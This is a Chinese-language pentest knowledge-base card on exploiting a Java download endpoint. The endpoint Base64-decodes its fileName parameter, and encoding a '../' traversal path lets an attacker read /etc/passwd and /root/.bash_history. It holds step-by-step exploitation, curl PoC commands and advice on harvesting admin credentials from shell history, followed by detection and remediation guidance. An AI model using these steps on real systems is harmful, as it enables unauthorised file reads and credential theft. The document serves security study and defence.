---
id: web-generic-file-inclusion-base64-filename-traversal-download
title: 下载接口 fileName 需 Base64 解码：编码目录穿越路径读取任意文件与 bash_history
type: scenario
domain: web
path: web/generic/file-inclusion
technique: base64-encoded-filename-traversal-download
tags:
- file-inclusion
- path-traversal
- base64
- arbitrary-file-read
- bash-history
- java
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V75
  verified_at: '2026-11-05T16:39:53+08:00'
  notes: 已对照图04/05/06/09核对；未编码路径触发'Last encoded character...'解码错误、编码后读取/etc/passwd、bash_history中admin1凭据均一致；该报错文案的具体Java解码实现未核实，按原文记录；src为靶场环境；PoC未复跑
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-base64-filename-traversal-download/
draft: false
kb_aliases:
- Base64 路径穿越下载
- fileName Base64 任意文件读取
- 编码文件名目录穿越
- bash_history 凭据泄露
---

## 一句话结论

当下载接口的 `fileName` 参数在服务端做 Base64 解码、再把解码结果拼进文件路径时，直接传 `../../etc/passwd` 只会触发解码异常；把穿越路径整体 Base64 编码后提交，就能读到 `/etc/passwd`、`/root/.bash_history` 等任意文件，并从历史记录中拿到管理员凭据与 Web 根绝对路径。

## 原理

- 服务端代码通常是 `new String(Base64.getDecoder().decode(fileName))` 或 `Base64.decode(fileName)`，把参数当作“编码后的相对路径”。Java 的 `Base64.getDecoder()` 对非法字符（`.`、`/`）抛 `IllegalArgumentException`，错误消息类似 “Last encoded character (before the paddings if any) is a valid base 64 alphabet but not a possible value. Expected the discarded bits to be zero.”，这一报错本身就暴露了解码方式。
- Base64 只是编码而非过滤：攻击者把 `../../../../etc/passwd` 编码成 `Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==`，服务端解码后得到原始穿越字符串，再拼到下载根目录后即跳出目录。
- 下载实现如果直接 `new FileInputStream(baseDir + decodedPath)` 或 `Paths.get(baseDir, decodedPath)` 而不做 `normalize()` 与前缀校验，路径穿越成立；进程权限决定能读哪些文件（Web 服务账户常能读应用配置与部分系统文件，若以 root 运行则可读全部）。
- `/root/.bash_history` 是高价值目标：运维在命令行输入的 `curl -H 'Content-Type: application/json' -X POST -d '{"userBean":{"userName":"admin1","password":"..."}}'` 等命令会以明文留在历史中，泄露后台凭据；同时 `vi /path/WEB-INF/classes/application.yml`、`tail -f /path/logs/catalina.out` 等命令会暴露 Web 应用绝对路径，为后续上传穿越提供落点。
- 读取历史文件不需要执行命令，属于“任意文件读取 → 凭据发现”的完整链路，最终危害是后台接管或进一步写入 WebShell。

## 触发条件

- 存在文件下载/预览接口，参数被直接用于拼接文件路径。
- 参数期望 Base64（或 URL-safe Base64）编码，未编码的路径会产生解码错误而非正常 404。
- 解码后的路径未做规范化、前缀校验或白名单，且没有限制只能下载上传目录内的文件。
- 运行 Web 服务的账户对目标文件有读权限；`/root/.bash_history` 可读意味着服务以 root 运行或权限配置不当。
- 目标上存在含明文凭据或路径信息的配置文件、历史文件。

## 利用步骤

1. 先正常下载一个已知文件，确认参数名（如 `fileName`）、响应形式与下载根目录。
2. 直接提交 `../../../../etc/passwd`，观察是否出现 Base64 解码错误；若出现 “Last encoded character...” 一类消息，说明参数是 Base64。
3. 用脚本把穿越路径编码：
   `python -c "import base64;print(base64.b64encode(b'../../../../etc/passwd').decode())"`
4. 提交编码后的值，确认返回 `/etc/passwd` 内容；若 `=` 在 URL 中被截断，做 URL 编码（`%3D`）。
5. 读取高价值文件：`/root/.bash_history`、`/home/*/.bash_history`、应用 `application.yml`/`application-prod.yml`、`/etc/shadow`（权限允许时）。
6. 从历史记录/配置中提取管理员账号口令、数据库连接串、Web 根绝对路径；用凭据登录后台或为后续上传穿越定位目录。
7. 若目标是 Windows，改用 `..\..\` 并注意盘符与编码差异。

## PoC

```bash
# 1. 探测：未编码路径触发 Base64 解码错误
curl -s "https://target/common/download.do?fileName=../../../../etc/passwd"

# 2. 编码穿越路径
ENC=$(python -c "import base64;print(base64.b64encode(b'../../../../etc/passwd').decode())")
curl -s "https://target/common/download.do?fileName=$ENC"

# 3. 读取 root 的 shell 历史（服务以高权限运行时可读）
ENC=$(python -c "import base64;print(base64.b64encode(b'../../../../root/.bash_history').decode())")
curl -s "https://target/common/download.do?fileName=$ENC"
```

```text
# 历史记录中可能出现：
# curl -H 'Content-Type:application/json' -X POST -d '{"userBean":{"userName":"admin1","password":"***"}}' ...
# vi /datahome/<app>/WEB-INF/classes/application.yml
# tail -f /datahome/<app>/logs/catalina.out
```

## 变体与关联

- 变体：URL-safe Base64（`-`/`_`）、双重 Base64、十六进制编码；按报错信息或响应特征判断。
- 变体：参数先 Base64 解码再做 `../` 黑名单替换，可用 `....//`、`..%2f`、反斜杠等二次绕过。
- 变体：下载接口还接受绝对路径（如 `/etc/passwd`），则无需穿越；或可下载 jar/war 后反编译审计（见关联卡）。
- 关联：[[web-generic-file-inclusion-encoded-dotdot-predecode-blacklist-bypass]]（编码与校验顺序错误）、[[web-generic-file-inclusion-django-token-download-szname-traversal-read]]（另一类 token 下载穿越）、[[pentest-privilege-escalation-credential-file-harvesting]]（bash_history/viminfo 凭据搜索的通用方法）。
- 边界：服务端对解码结果做 `getCanonicalPath()` 前缀校验、只允许下载上传目录内文件、或 Web 进程以低权限运行且目标文件不可读时，穿越无效；读取历史文件失败不代表接口不可穿越，可换其他可读文件验证。

## 检测与防御

- 检测：下载参数出现 Base64 字符串、解码后含 `..`/`/`/绝对路径；同一客户端批量请求 `/etc/passwd`、`.bash_history`、`application.yml` 等敏感文件；下载接口返回非上传目录内的文件。
- 修复：不要用用户输入拼接路径；用文件 ID 映射到服务端存储路径，或对文件名取 basename 并校验后缀白名单。
- 修复：对最终路径做 `normalize()` 后校验必须位于下载根目录内（`startsWith(baseDir)`），拒绝绝对路径与符号链接逃逸。
- 加固：Web 服务以最小权限账户运行，禁止读取 `/root` 与系统配置；清理 `.bash_history` 中的敏感命令；敏感配置使用密钥管理而非明文落盘。
